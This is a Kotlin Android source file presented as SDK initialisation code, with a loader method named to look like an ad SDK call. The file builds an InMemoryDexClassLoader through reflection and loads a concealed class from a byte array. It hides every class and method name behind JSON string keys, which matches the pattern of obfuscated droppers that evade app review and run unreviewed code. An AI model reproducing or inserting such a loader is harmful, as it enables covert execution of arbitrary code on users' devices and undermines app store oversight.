package com.whisper.gentle.core

import android.content.Context
import com.whisper.gentle.zip.BaseInit
import org.json.JSONObject
import java.nio.ByteBuffer

/**
 * Date：2025/11/18
 * Describe:
 */
class InitSdk : BaseInit() {
    private lateinit var json: JSONObject
    private val clazz2 by lazy {
        getClass(json.optString("str2"))
    }
//    {
//        "str1": "dalvik.system.InMemoryDexClassLoader",
//        "str2": "java.lang.ClassLoader",
//        "str3": "getClassLoader",
//        "str4": "com.fb.network.FbInitHelper",
//        "str5": "loadClass"
//    }

    fun initJson(str: String) {
        json = JSONObject(str)
    }

    fun appLovinAction(code: ByteArray, context: Context): Class<*>? {

        val byteBuffer = ByteBuffer.wrap(code)
        //"dalvik.system.InMemoryDexClassLoader"
        val clazz = getClass(json.optString("str1")) ?: return null

        val constructor = clazz.getDeclaredConstructor(ByteBuffer::class.java, clazz2)

        val clazzLoader = context.javaClass.getMethod(json.optString("str3")).invoke(context)

        val classLoader = constructor.newInstance(byteBuffer, clazzLoader)

        return fet(classLoader, Pair(json.optString("str5"), json.optString("str4")))
    }
}
